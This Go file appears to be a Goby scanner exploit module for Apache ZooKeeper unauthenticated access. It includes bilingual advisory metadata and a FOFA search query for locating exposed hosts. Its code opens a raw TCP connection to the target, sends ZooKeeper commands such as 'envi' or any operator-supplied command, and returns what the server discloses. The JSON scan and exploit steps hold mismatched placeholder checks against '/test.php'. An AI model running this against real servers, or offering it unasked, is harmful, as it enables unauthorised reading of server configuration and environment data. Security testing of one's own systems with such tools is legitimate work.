package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache Zookeeper unauthenticated access vulnerability",
    "Description": "<p>Zookeeper is an open-source distributed coordination service used for managing and coordinating configuration information, naming services, distributed locks, and distributed queues of large-scale distributed applications.</p><p>There is an unauthenticated access vulnerability in Zookeeper, which allows attackers to access and obtain unauthorized resources from the Zookeeper server via the network.</p>",
    "Product": "APACHE-ZooKeeper",
    "Homepage": "http://zookeeper.apache.org/",
    "DisclosureDate": "2023-05-25",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "protocol=\"zookeeper\"",
    "GobyQuery": "protocol=\"zookeeper\"",
    "Level": "2",
    "Impact": "<p>There is an unauthenticated access vulnerability in Zookeeper, which allows attackers to access and obtain unauthorized resources from the Zookeeper server via the network.</p>",
    "Recommendation": "<p>1. Change the default port of ZooKeeper to use another port for the service and configure source address restrictions.</p><p>2. Add authentication configuration for ZooKeeper.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "envi",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Apache Zookeeper 未授权访问漏洞",
            "Product": "APACHE-ZooKeeper",
            "Description": "<p>Zookeeper 是一个开源的分布式协调服务，用于管理和协调大规模分布式应用程序的配置信息、命名服务、分布式锁和分布式队列等。<br></p><p>Zookeeper 存在未授权访问漏洞，攻击者可以利用该漏洞通过网络访问并获取未经授权的Zookeeper服务器资源。<br></p>",
            "Recommendation": "<p>1、修改 ZooKeeper 默认端口，采用其他端口服务，配置服务来源地址限制策略。</p><p>2、增加 ZooKeeper 的认证配置。</p>",
            "Impact": "<p>Zookeeper 存在未授权访问漏洞，攻击者可以利用该漏洞通过网络访问并获取未经授权的Zookeeper服务器资源。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Apache Zookeeper unauthenticated access vulnerability",
            "Product": "APACHE-ZooKeeper",
            "Description": "<p>Zookeeper is an open-source distributed coordination service used for managing and coordinating configuration information, naming services, distributed locks, and distributed queues of large-scale distributed applications.</p><p>There is an unauthenticated access vulnerability in Zookeeper, which allows attackers to access and obtain unauthorized resources from the Zookeeper server via the network.</p>",
            "Recommendation": "<p>1. Change the default port of ZooKeeper to use another port for the service and configure source address restrictions.</p><p>2. Add authentication configuration for ZooKeeper.</p>",
            "Impact": "<p>There is an unauthenticated access vulnerability in Zookeeper, which allows attackers to access and obtain unauthorized resources from the Zookeeper server via the network.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10887"
}`

	sendPayloadFlagPpsk2D := func(host, cmd string) (string, error) {
		conn, err := httpclient.GetTCPConn(host, time.Second*10)
		if err != nil {
			return "", err
		}
		defer conn.Close()
		conn.Write([]byte(cmd))
		resp := make([]byte, 4096)
		_, err = conn.Read(resp)
		if err != nil {
			return "", err
		}
		return string(resp), nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayloadFlagPpsk2D(u.HostInfo, "envi")
			if err != nil {
				return false
			} else {
				return strings.Contains(rsp, "Environment:")
			}
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := goutils.B2S(ss.Params["cmd"])
			rsp, err := sendPayloadFlagPpsk2D(expResult.HostInfo.HostInfo, cmd)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				expResult.Success = true
				expResult.Output = rsp
			}
			return expResult
		},
	))
}
